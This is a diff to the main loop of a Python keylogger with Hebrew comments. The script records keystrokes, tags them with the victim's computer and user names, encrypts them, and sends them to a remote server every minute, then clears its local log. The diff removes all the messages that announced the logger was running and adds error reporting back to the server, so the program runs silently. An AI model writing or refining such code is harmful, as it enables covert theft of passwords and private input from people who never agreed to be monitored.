@@ -2,10 +2,10 @@ from component import *
 import time
 import os
 import socket
-import logging
+import time
 
 # הגדרת תדירות השליחה (בשניות)
-SEND_INTERVAL = 60  # ניתן לשנות לפי הצורך
+Send_time = 60  # ניתן לשנות לפי הצורך
 
 def main():
     # יצירת אובייקטים
@@ -19,12 +19,13 @@ def main():
     except Exception:
         user_name = "UnknownUser"
 
-    print(f"🔴 Starting KeyLogger on {computer_name} ({user_name})...")
-    key_logger.start_logging()
+    key_logger.start_logging()  # התחלת ההקלטה
+
+    last_error = None  # משתנה לשמירת הודעות שגיאה במקרה של כשלון שליחה
 
     try:
         while True:
-            time.sleep(SEND_INTERVAL)  # מחכה לפי ההגדרה
+            time.sleep(Send_time)  # מחכה לפי ההגדרה
             
             # חותמת זמן
             timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
@@ -41,24 +42,23 @@ def main():
                 "keys": key_data
             }
 
+            # אם היה כשלון קודם, נוסיף אותו להודעה כדי שהשרת ידע
+            if last_error:
+                data_to_send["last_error"] = last_error
+                last_error = None  # מאפסים את השגיאה אחרי שהודענו עליה
+
             # הצפנה
             encrypted_data = encryptor.encrypt(str(data_to_send))
 
-            # שליחה
+            # שליחה לשרת
             try:
                 NetworkWriter.send_data(encrypted_data)
-                print(f"✅ Data sent at {timestamp} from {computer_name} ({user_name})")
-
-                # ניקוי הלוג אחרי שליחה מוצלחת
-                key_logger.clear_log()
-
+                key_logger.clear_log()  # ניקוי הלוג אחרי שליחה מוצלחת
             except Exception as e:
-                print(f"❌ Error sending data: {e}")
+                last_error = f"Failed to send data at {timestamp}: {str(e)}"
 
     except KeyboardInterrupt:
-        print("\n🛑 Stopping KeyLogger...")
-        key_logger.stop_logging()
+        key_logger.stop_logging()  # עצירת ההקלטה אם התהליך נעצר ידנית
 
 if __name__ == "__main__":
     main()
-
